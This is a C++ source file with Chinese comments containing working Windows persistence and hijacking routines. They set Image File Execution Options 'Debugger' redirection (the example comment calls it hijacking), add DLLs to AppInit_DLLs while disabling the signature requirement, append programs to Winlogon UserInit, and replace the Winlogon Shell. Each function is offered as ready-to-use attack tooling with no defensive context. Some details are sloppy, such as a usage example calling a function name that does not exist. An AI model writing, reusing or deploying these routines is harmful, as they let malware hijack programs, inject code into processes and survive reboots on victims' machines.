#include <windows.h>
#include <string>
#include <iostream>
#include <vector>
#include <sstream>
#include <algorithm>
#include <cctype>

bool SetImageFileExecutionRedirect(const std::string& sourceExePath, const std::string& targetExePath) {
	for(int i=0;i<10;i++){
    // 从源路径中提取可执行文件名（带扩展名）
    size_t lastSlash = sourceExePath.find_last_of("\\/");
    std::string exeName = (lastSlash != std::string::npos) ? 
                         sourceExePath.substr(lastSlash + 1) : sourceExePath;

    // 构造注册表路径
    std::string regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + exeName;

    // 打开注册表项
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, NULL,
                       REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    // 设置调试器值（格式："目标路径" - 双引号确保路径空格正确处理）
    std::string debuggerValue = "\"" + targetExePath + "\"";
    
    // 写入注册表
    if (RegSetValueExA(hKey, "Debugger", 0, REG_SZ, 
                      (const BYTE*)debuggerValue.c_str(), 
                      static_cast<DWORD>(debuggerValue.size() + 1)) != ERROR_SUCCESS) {
		std::cerr<<"Write to reg failed.";
        RegCloseKey(hKey);
        //return false;
    }

    RegCloseKey(hKey);
	}
    return true;
}

/* 使用示例：
int main() {
    std::string source = "C:\\Program Files\\OriginalApp\\app.exe";
    std::string target = "C:\\Redirect\\redirector.exe";
    
    if (SetImageFileExecutionRedirect(source, target)) {
        // 劫持成功
    } else {
        // 劫持失败
    }
    return 0;
}
*/



// ---------- 内部辅助函数（通用） ----------
static bool SetAppInitDLLsInternal(const std::string& dllPath, bool enable, bool is64Bit) {
    // 根据位数选择访问标志
    REGSAM samDesired = KEY_READ | KEY_WRITE;
    if (is64Bit)
        samDesired |= KEY_WOW64_64KEY;   // 操作 64 位注册表视图
    else
        samDesired |= KEY_WOW64_32KEY;   // 操作 32 位注册表视图 (WOW6432Node)

    HKEY hKey;
    LONG lResult = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        0,
        samDesired,
        &hKey
    );
    if (lResult != ERROR_SUCCESS)
        return false;

    bool success = false;

    if (enable) {
        // 读取当前 AppInit_DLLs
        char currentValue[4096] = {0};
        DWORD dwSize = sizeof(currentValue);
        DWORD dwType = REG_SZ;
        lResult = RegQueryValueExA(hKey, "AppInit_DLLs", NULL, &dwType, (LPBYTE)currentValue, &dwSize);

        std::string newValue;
        if (lResult == ERROR_SUCCESS && dwType == REG_SZ) {
            // 解析已有 DLL 列表（逗号分隔）
            std::vector<std::string> dlls;
            std::stringstream ss(currentValue);
            std::string item;
            while (std::getline(ss, item, ',')) {
                item.erase(item.begin(), std::find_if(item.begin(), item.end(), [](unsigned char ch) {
                    return !std::isspace(ch);
                }));
                item.erase(std::find_if(item.rbegin(), item.rend(), [](unsigned char ch) {
                    return !std::isspace(ch);
                }).base(), item.end());
                if (!item.empty())
                    dlls.push_back(item);
            }

            // 检查是否已存在
            bool exists = false;
            for (const auto& d : dlls) {
                if (_stricmp(d.c_str(), dllPath.c_str()) == 0) {
                    exists = true;
                    break;
                }
            }
            if (!exists)
                dlls.push_back(dllPath);

            // 重新组合
            for (size_t i = 0; i < dlls.size(); ++i) {
                if (i > 0) newValue += ',';
                newValue += dlls[i];
            }
        } else {
            newValue = dllPath;
        }

        // 写入 AppInit_DLLs
        lResult = RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                                 (const BYTE*)newValue.c_str(),
                                 static_cast<DWORD>(newValue.size() + 1));
        if (lResult != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }

        // 启用加载 (LoadAppInit_DLLs = 1)
        DWORD dwLoad = 1;
        RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD,
                       (const BYTE*)&dwLoad, sizeof(dwLoad));

        // 禁用签名校验 (RequireSignedAppInit_DLLs = 0)
        DWORD dwRequire = 0;
        RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD,
                       (const BYTE*)&dwRequire, sizeof(dwRequire));

        success = true;
    } else {
        // 移除模式：从列表中删除指定 DLL
        char currentValue[4096] = {0};
        DWORD dwSize = sizeof(currentValue);
        DWORD dwType = REG_SZ;
        lResult = RegQueryValueExA(hKey, "AppInit_DLLs", NULL, &dwType, (LPBYTE)currentValue, &dwSize);
        if (lResult == ERROR_SUCCESS && dwType == REG_SZ) {
            std::vector<std::string> dlls;
            std::stringstream ss(currentValue);
            std::string item;
            while (std::getline(ss, item, ',')) {
                item.erase(item.begin(), std::find_if(item.begin(), item.end(), [](unsigned char ch) {
                    return !std::isspace(ch);
                }));
                item.erase(std::find_if(item.rbegin(), item.rend(), [](unsigned char ch) {
                    return !std::isspace(ch);
                }).base(), item.end());
                if (!item.empty() && _stricmp(item.c_str(), dllPath.c_str()) != 0)
                    dlls.push_back(item);
            }
            std::string newValue;
            for (size_t i = 0; i < dlls.size(); ++i) {
                if (i > 0) newValue += ',';
                newValue += dlls[i];
            }
            RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                           (const BYTE*)newValue.c_str(),
                           static_cast<DWORD>(newValue.size() + 1));
            success = true;
        } else {
            success = true; // 原本就不存在，视为成功
        }
    }

    RegCloseKey(hKey);
    return success;
}

// ---------- 对外公开的两个函数 ----------
/**
 * 将 32 位 DLL 添加到 AppInit_DLLs（操作 WOW6432Node 视图）
 * @param dllPath DLL 完整路径（如 "C:\\Windows\\System32\\My32.dll"）
 * @param enable  true=添加，false=移除
 * @return 成功返回 true
 */
bool SetAppInitDLLs32(const std::string& dllPath, bool enable = true) {
    return SetAppInitDLLsInternal(dllPath, enable, false);
}

/**
 * 将 64 位 DLL 添加到 AppInit_DLLs（操作 64 位原生视图）
 * @param dllPath DLL 完整路径（如 "C:\\Windows\\System32\\My64.dll"）
 * @param enable  true=添加，false=移除
 * @return 成功返回 true
 */
bool SetAppInitDLLs64(const std::string& dllPath, bool enable = true) {
    return SetAppInitDLLsInternal(dllPath, enable, true);
}

bool AddToUserInit(const std::string& programPath) {

    HKEY hKey;
    const char* subKey = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    
    // 1. 打开注册表项
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        subKey,
        0,
        KEY_READ | KEY_WRITE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
		std::cerr<<"Open Reg Failed.\n";
        return false;
    }

    // 2. 获取当前 UserInit 值
    char currentValue[1024];
    DWORD bufferSize = sizeof(currentValue);
    DWORD type = REG_SZ;
    
    result = RegQueryValueExA(
        hKey,
        "UserInit",
        NULL,
        &type,
        reinterpret_cast<LPBYTE>(currentValue),
        &bufferSize
    );

    if (result != ERROR_SUCCESS) {
		std::cerr<<"Get Reg Value Failed.\n";
        RegCloseKey(hKey);
        return false;
    }

    // 3. 构造新值（保留原始值 + 添加新路径）
    std::string newValue = currentValue;
    
    // 确保以逗号分隔（原始值通常以逗号结尾）
    if (!newValue.empty() && newValue.back() != ',') {
        newValue += ',';
    }
    
    newValue += programPath;
    newValue += ',';  // UserInit 要求路径以逗号结尾

    // 4. 更新注册表值
    result = RegSetValueExA(
        hKey,
        "UserInit",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(newValue.c_str()),
        static_cast<DWORD>(newValue.length() + 1)
    );
	

	
    // 5. 清理资源
    RegCloseKey(hKey);
	
    return 1;
}

bool SetSystemShell(const std::string& newShellPath) {

    // 打开 Winlogon 注册表项
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    // 设置 Shell 值
    result = RegSetValueExA(
        hKey,
        "Shell",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(newShellPath.c_str()),
        static_cast<DWORD>(newShellPath.size() + 1)
    );

    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    // 设置 Userinit 值（保留原始 userinit 并添加新 shell）
    std::string userInitValue = "C:\\Windows\\system32\\userinit.exe," + newShellPath;
    
    result = RegSetValueExA(
        hKey,
        "Userinit",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(userInitValue.c_str()),
        static_cast<DWORD>(userInitValue.size() + 1)
    );

    RegCloseKey(hKey);
	
    return 1;
}

/* 使用示例：
int main() {
    std::string customShell = "C:\\Path\\To\\YourShell.exe";
    
    if (SetSystemShellA(customShell)) {
        // 修改成功，需要重启生效
        MessageBoxA(nullptr, "Shell修改成功，重启后生效", "成功", MB_OK);
    } else {
        MessageBoxA(nullptr, "Shell修改失败", "错误", MB_ICONERROR);
    }
    return 0;
}
*/
